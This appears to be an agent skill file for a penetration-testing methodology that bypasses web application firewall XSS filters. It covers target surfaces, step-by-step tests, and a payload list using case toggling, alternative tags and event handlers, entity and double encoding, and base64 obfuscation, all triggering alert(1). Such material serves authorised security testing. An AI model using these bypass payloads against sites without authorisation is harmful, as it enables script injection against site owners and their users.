---
name: waf-evasion-xss
description: Skill for bypassing WAF XSS filters using encoding techniques, event handler abuse, structural manipulation, and browser-specific quirks. Built from the Awesome-WAF knowledge base.
sources: github
report_count: 50
---

# WAF Evasion - XSS

## Automated Scan (Run First)

```bash
# Use dalfox or XSStrike for automated XSS detection
# Then apply evasion techniques manually
```

## Crown Jewel Targets

- Input fields that reflect user input
- URL parameters reflected in page content
- JSON/API endpoints that render responses
- File upload filenames reflected in responses
- Error messages containing user input

## Attack Surface Signals

- WAF blocks `<script>` tags but allows `<svg>` or `<img>`
- WAF blocks `onerror` but allows `onload` or `ontoggle`
- WAF blocks uppercase but allows mixed case
- WAF blocks standard event handlers but allows uncommon ones

## Step-by-Step Methodology

1. Test basic payload: `<script>alert(1)</script>` - confirm blocked
2. Test case toggling: `<ScRipT>alert(1)</sCRipT>`
3. Test encoding: `%3Cscript%3Ealert(1)%3C/script%3E`
4. Test alternative tags: `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`
5. Test uncommon event handlers: `ontoggle`, `onwheel`, `onfilterchange`
6. Test autofocus + event: `<input autofocus onfocus=alert(1)>`
7. Test HPP splitting: `?p=<script&p>=alert(1)</script>`
8. Test comment injection: `<svg><!--><img src=x onerror=alert(1)>-->`
9. Test double encoding: `%253Cscript%253E`
10. Test mixed encoding with tabs/newlines

## Payload & Detection Patterns

```html
<!-- Case toggling -->
<ScRipT>alert(1)</sCRipT>

<!-- Alternative tags -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>

<!-- Uncommon event handlers -->
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>

<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- JavaScript obfuscation -->
<script>eval(atob('YWxlcnQoMSk='))</script>
```

## Common Root Causes

- WAF signature lists are incomplete (miss uncommon event handlers)
- WAFs normalize input inconsistently (encoding differences)
- WAFs don't handle all HTML contexts equally
- WAFs may not inspect certain content types or request bodies
- WAFs have parsing differences from browsers

## Bypass Techniques

- Encoding escalation: URL -> Double URL -> Unicode -> Mixed
- Alternative HTML contexts: body, attribute, script, style
- Polyglot payloads that work across multiple contexts
- Browser-specific features (different event handlers per browser)

## Gate 0 Validation

- [ ] Have I confirmed the WAF blocks standard XSS?
- [ ] Have I tried all alternative event handlers?
- [ ] Have I tested encoding variations?
- [ ] Have I documented which bypass technique worked?
